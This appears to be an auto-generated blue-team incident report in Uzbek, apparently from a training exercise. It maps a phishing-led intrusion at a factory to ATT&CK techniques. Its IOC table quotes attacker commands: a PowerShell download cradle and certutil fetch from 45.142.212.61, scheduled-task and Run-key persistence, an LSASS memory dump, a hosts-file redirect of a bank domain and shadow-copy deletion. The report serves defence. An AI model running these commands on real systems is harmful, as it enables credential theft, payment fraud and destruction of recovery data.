# Hodisa bo'yicha hisobot: Incident Report - Day1
**Tashkilot**: Zavod XY | **Sana**: 2026-10-05 | **Jamoa**: Team Alpha | **Tahlilchi**: Blue Team

## Qisqacha mazmuni
Tergov 33 hodisa, 4 host, 34 ATT&CK texnikasi aniqladi. Boshlang'ich kirish: T1566.001. Ta'sir: T1490, T1565.001, T1657. 17 IOC ajratildi. 8 remediation amali bajarildi.

> **WARNING**: Davriy trafik (checker/SLA) aniqlandi — remediation'da tegilmadi

## ATT&CK texnikalari
| ID | Nomi | Taktika | Soni | Dalil |
|---|---|---|---|---|
| T1566.001 | Spearphishing Attachment | initial-access | 1 |  |
| T1053.005 | Scheduled Task | execution | 3 |  |
| T1059 | Command and Scripting Interpreter | execution | 1 |  |
| T1059.001 | PowerShell | execution | 4 |  |
| T1059.003 | Windows Command Shell | execution | 1 |  |
| T1059.005 | Visual Basic | execution | 1 |  |
| T1204.002 | Malicious File | execution | 1 |  |
| T1569.002 | Service Execution | execution | 1 |  |
| T1098 | Account Manipulation | persistence | 1 |  |
| T1543.003 | Windows Service | persistence | 1 |  |
| T1547.001 | Registry Run Keys / Startup Folder | persistence | 2 |  |
| T1027 | Obfuscated Files or Information | stealth | 1 |  |
| T1078 | Valid Accounts | stealth | 2 |  |
| T1078.003 | Local Accounts | stealth | 3 | Administrator |
| T1218 | System Binary Proxy Execution | stealth | 3 |  |
| T1218.011 | Rundll32 | stealth | 1 |  |
| T1574.001 | DLL | stealth | 1 |  |
| T1003.001 | LSASS Memory | credential-access | 1 |  |
| T1110 | Brute Force | credential-access | 1 |  |
| T1112 | Modify Registry | defense-impairment | 3 |  |
| T1552.001 | Credentials In Files | credential-access | 2 |  |
| T1685 | Disable or Modify Tools | defense-impairment | 3 |  |
| T1685.005 | Clear Windows Event Logs | defense-impairment | 1 |  |
| T1018 | Remote System Discovery | discovery | 1 |  |
| T1069.002 | Domain Groups | discovery | 1 |  |
| T1087.002 | Domain Account | discovery | 1 |  |
| T1135 | Network Share Discovery | discovery | 1 |  |
| T1021.001 | Remote Desktop Protocol | lateral-movement | 2 |  |
| T1071.001 | Web Protocols | command-and-control | 1 | 45.142.212.61:443 (beacon.exe) |
| T1105 | Ingress Tool Transfer | command-and-control | 3 |  |
| T1219 | Remote Access Tools | command-and-control | 2 |  |
| T1490 | Inhibit System Recovery | impact | 1 |  |
| T1565.001 | Stored Data Manipulation | impact | 3 |  |
| T1657 | Financial Theft | impact | 1 |  |

## Murosaga kelishuv indikatorlari (IOC)
| Turi | Qiymati | Soni | Birinchi | Oxirgi |
|---|---|---|---|---|
| ip | 172.16.9.9 | 5 | 2026-10-05T08:59:00 | 2026-10-05T09:19:00 |
| ip | 10.10.20.60 | 5 | 2026-10-05T08:59:00 | 2026-10-05T09:19:00 |
| unix_path | GET /health | 5 | 2026-10-05T08:59:00 | 2026-10-05T09:19:00 |
| win_path | C:\Program Files\Microsoft Office\WINWORD.EXE /n rezyume.docm | 1 | 2026-10-05T09:01:12 | 2026-10-05T09:01:12 |
| unix_path | IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1') | 1 | 2026-10-05T09:01:59 | 2026-10-05T09:01:59 |
| unix_path | certutil.exe -urlcache -split -f http://45.142.212.61/beacon.exe C:\Users\hr.olim\AppData\Local\Temp\beacon.exe | 1 | 2026-10-05T09:02:20 | 2026-10-05T09:02:20 |
| ip | 10.10.20.51 | 13 | 2026-10-05T09:02:35 | 2026-10-05T09:23:00 |
| ip | 45.142.212.61 | 5 | 2026-10-05T09:02:35 | 2026-10-05T09:20:00 |
| unix_path | schtasks /create /sc onlogon /tn Updater /tr C:\Users\hr.olim\AppData\Local\Temp\beacon.exe | 1 | 2026-10-05T09:07:10 | 2026-10-05T09:07:10 |
| unix_path | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\hr.olim\AppData\Local\Temp\beacon.exe /f | 1 | 2026-10-05T09:07:40 | 2026-10-05T09:07:40 |
| unix_path | net view /domain | 1 | 2026-10-05T09:12:03 | 2026-10-05T09:12:03 |
| unix_path | nltest /dclist:corp.local | 1 | 2026-10-05T09:12:20 | 2026-10-05T09:12:20 |
| unix_path | net group "Domain Admins" /domain | 1 | 2026-10-05T09:12:41 | 2026-10-05T09:12:41 |
| win_path | C:\Windows\System32\rundll32.exe comsvcs.dll, MiniDump 720 C:\Windows\Temp\lsass.dmp full | 1 | 2026-10-05T09:14:05 | 2026-10-05T09:14:05 |
| unix_path | cmd.exe /c echo 91.238.50.10 ibank.example.uz >> C:\Windows\System32\drivers\etc\hosts | 1 | 2026-10-05T09:28:40 | 2026-10-05T09:28:40 |
| unix_path | 1cv8.exe ENTERPRISE /N buxgalter kl_to_1c.txt payment_order edited | 1 | 2026-10-05T09:31:02 | 2026-10-05T09:31:02 |
| unix_path | vssadmin delete shadows /all /quiet | 1 | 2026-10-05T09:35:50 | 2026-10-05T09:35:50 |

## Xronologiya
| Vaqt | Host | Foydalanuvchi | ATT&CK | Buyruq |
|---|---|---|---|---|
| 2026-10-05T08:59:00 | GW-CHECK | checker |  |  |
| 2026-10-05T09:01:12 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:01:44 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:01:59 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:02:20 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:02:35 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:04:00 | GW-CHECK | checker |  |  |
| 2026-10-05T09:05:00 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:07:10 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:07:40 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:09:00 | GW-CHECK | checker |  |  |
| 2026-10-05T09:10:00 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:12:03 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:12:20 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:12:41 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:14:00 | GW-CHECK | checker |  |  |
| 2026-10-05T09:14:05 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:15:00 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:19:00 | GW-CHECK | checker |  |  |
| 2026-10-05T09:20:00 | HR-PC01 | hr.olim |  |  |
| 2026-10-05T09:20:11 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:20:22 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:20:33 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:20:44 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:20:55 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:21:06 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:21:30 | DC01 | SYSTEM |  |  |
| 2026-10-05T09:23:00 | BUX-PC05 | bux.aziza |  |  |
| 2026-10-05T09:25:14 | BUX-PC05 | bux.aziza |  |  |
| 2026-10-05T09:28:40 | BUX-PC05 | bux.aziza |  |  |
| 2026-10-05T09:31:02 | BUX-PC05 | bux.aziza |  |  |
| 2026-10-05T09:35:50 | BUX-PC05 | bux.aziza |  |  |
| 2026-10-05T09:36:20 | BUX-PC05 | bux.aziza |  |  |

## Bartaraf etish holati
| Element | ATT&CK | Holat |
|---|---|---|
| AnyDesk | T1219 | buyruq tayyorlandi |
| 91.238.50.10 ibank.example.uz | T1565.001 | buyruq tayyorlandi |
| 45.142.212.61:443 (beacon.exe) | T1071.001 | buyruq tayyorlandi |
| Updater | T1053.005 | buyruq tayyorlandi |
| Updater | T1547.001 | buyruq tayyorlandi |
| Administrator | T1078.003 | buyruq tayyorlandi |
| checker_admin | T1078.003 | buyruq tayyorlandi |
| admin | T1078.003 | buyruq tayyorlandi |
| C:\Windows\System32\rundll32.exe |  | qo'lda tekshirilsin |
| C:\Users\hr.olim\AppData\Local\Temp\beacon.exe |  | qo'lda tekshirilsin |
| C:\Windows\Temp\lsass.dmp |  | qo'lda tekshirilsin |
| beacon.exe |  | qo'lda tekshirilsin |
| rundll32.exe |  | qo'lda tekshirilsin |
| dclist:corp.local |  | qo'lda tekshirilsin |
| lsass.dmp |  | qo'lda tekshirilsin |
